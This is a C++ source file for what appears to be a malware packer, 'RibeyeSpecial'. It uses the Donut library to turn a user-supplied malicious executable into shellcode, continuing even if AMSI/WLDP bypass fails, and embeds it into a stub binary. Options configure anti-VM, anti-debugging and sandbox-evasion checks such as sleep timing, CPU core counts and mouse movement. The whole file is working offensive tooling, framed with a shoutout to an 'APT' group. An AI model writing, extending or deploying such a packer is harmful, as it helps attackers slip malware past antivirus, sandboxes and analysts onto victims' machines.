// RibeyeSpecial.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
#include <Windows.h>
#include <iostream>
#include <fstream>
#include "donut.h"
#include "tclap/CmdLine.h"
#include "Helper.h"
#include "RibeyeBone64.h"
#include "RibeyeBone86.h"

#pragma comment(lib, "donut.lib")

#define MAX_BUFFER 4097152
// Struct that will determine the configuration to run this

std::string payload_output = "";

struct Coconut
{
	int AES_Key = 20;
	int sleepTime = 5000;
	bool sleep = false;
	bool antivm = false;
	bool prime = false;
	bool mouse = false;
	bool acceleratedsleep = false;
	bool debugger = false;
	bool ram = false;
	bool cpu_core = true;
	int szData = 0;
	char opcodes[2097152] = { 0 };
} coconut;


// File is the malicious file we want to run
int writeShellCode(const char * file)
{
	DONUT_CONFIG c;

	// zero initialize configuration
	memset(&c, 0, sizeof(c));

	// default type is position independent code for dual-mode (x86 + amd64)
	c.inst_type = DONUT_INSTANCE_PIC;
	c.arch = DONUT_ARCH_X84;
	c.bypass = DONUT_BYPASS_SKIP;  // continues loading even if disabling AMSI/WLDP fails
	c.compress = 0;                      // compression is not implemented yet
	c.encode = 0;                      // don't encode with base64
	c.thread = 0;                      // run entrypoint for unmanaged EXE without thread
	c.ansi = 0;                      // command line will be converted to unicode
	c.exit = 0;                      // don't call RtlExitUserProcess to terminate host process
	c.mod_type = DONUT_MODULE_EXE;
	memcpy(c.file, file, strlen(file));

	char  * buffer = new char[MAX_BUFFER];
	std::ifstream infile(file);
	//get length of file
	infile.seekg(0, std::ios::end);
	size_t length = infile.tellg();
	infile.seekg(0, std::ios::beg);

	// don't overflow the buffer!
	if (length > MAX_BUFFER)
	{
		length = MAX_BUFFER;
	}
	printf("[+] length of payload: %d bytes\n", length);

	//read file
	infile.read(buffer, length);

	DonutCreate(&c);

	coconut.szData = c.pic_len;

	memcpy((void*)coconut.opcodes, c.pic, c.pic_len);

	std::ifstream Bone("RibeyeBone.exe", std::ios::in | std::ios::binary);

	char* bone_buffer = new char[MAX_BUFFER];
	//get length of file
	Bone.seekg(0, std::ios::end);
	size_t bone_length = Bone.tellg();
	Bone.seekg(0, std::ios::beg);

	// don't overflow the buffer!
	if (bone_length > MAX_BUFFER)
	{
		bone_length = MAX_BUFFER;
	}

	Bone.read(bone_buffer, bone_length);

	uintptr_t marker = FindPattern((char*)bone_buffer, bone_length, (char*)"COCONUTZ", (char*)"xxxxxxxx");

	if (marker == NULL)
	{
		printf("[!] Can't find COCONUTZ marker, abort!\n");
		return 1;
	}

	INT64 offset = (INT64)marker - (INT64)bone_buffer;

	printf("[+] Found coconutz marker at %p from %p [offset: %d] with string %s\n", marker, bone_buffer, offset, marker);

	printf("[+] Size of coconut %d %p vs size of bone stud %d %p\n", sizeof coconut, sizeof coconut, bone_length, bone_length);

	memcpy(bone_buffer + offset, &coconut, sizeof(coconut));

	std::ofstream outfile(payload_output, std::ofstream::binary);

	outfile.write((const char*)bone_buffer, bone_length);

	printf("[+] Check for %s, that is ur payload :D\n", payload_output.data());

	return 1;
}

int main(int argc, char** argv)
{
	try {

		// Define the command line object, and insert a message
		// that describes the program. The "Command description message"
		// is printed last in the help text. The second argument is the
		// delimiter (usually space) and the last one is the version number.
		// The CmdLine object parses the argv array based on the Arg objects
		// that it contains.


		//                     MESSAGE                 DELIMITER  VERSION
		TCLAP::CmdLine cmd(R"(Shoutout to APT69 and the brothers that are in it. https://twitter.com/TomahawkApt69 )", ' ', "0.1");

		TCLAP::ValueArg<std::string> filepath("f", "file", "Path to file to execute", true, "C:\\Users\\Dev\\Desktop\\malware.exe", "string");
		TCLAP::ValueArg<std::string> outputname("o", "output", "Output file name", true, "ribeye.exe", "string");
		TCLAP::ValueArg<int> sleeptime("t", "sleeptime", "How long to sleep for (in ms) if -s is enabled", false , 5000, "integer");

		// Add the argument nameArg to the CmdLine object. The CmdLine object
		// uses this Arg to parse the command line.
		cmd.add(filepath);
		cmd.add(outputname);
		cmd.add(sleeptime);

		TCLAP::SwitchArg bVirtual("v", "vm", "Detect VM using CPUID", cmd, false);
		TCLAP::SwitchArg bSleep("s", "sleep", "Sleep to evade sandbox", cmd, false);
		TCLAP::SwitchArg bPrime("p", "prime", "Prime calculation to evade sandbox", cmd, false);
		TCLAP::SwitchArg bMouse("m", "mouse", "Check mouse movement, evade sandbox", cmd, false);
		TCLAP::SwitchArg bAccel("a", "accel", "Check if sleep is being accelerated, evade sandbox", cmd, false);
		TCLAP::SwitchArg bDebugger("d", "debugger", "Check if we are being debugged, anti debug", cmd, false);
		TCLAP::SwitchArg bRam("r", "ram", "Check RAM size, anti VM", cmd, false);
		TCLAP::SwitchArg bCore("c", "core", "Check CPU core count, anti VM", cmd, false);

		// Parse the argv array.
		cmd.parse(argc, argv);
		coconut.sleep = bSleep.getValue();
		coconut.sleepTime = sleeptime.getValue();
		coconut.antivm = bVirtual.getValue();
		coconut.prime = bPrime.getValue();
		coconut.mouse = bMouse.getValue();
		coconut.acceleratedsleep = bAccel.getValue();
		coconut.debugger = bDebugger.getValue();
		coconut.ram = bRam.getValue();
		coconut.cpu_core = bCore.getValue();;
		
		std::string targetFile = filepath.getValue();
		payload_output = outputname.getValue();
		writeShellCode(targetFile.data());

	}
	catch (TCLAP::ArgException &e)  // catch any exceptions
	{
		std::cerr << "error: " << e.error() << " for arg " << e.argId() << std::endl;
	}

}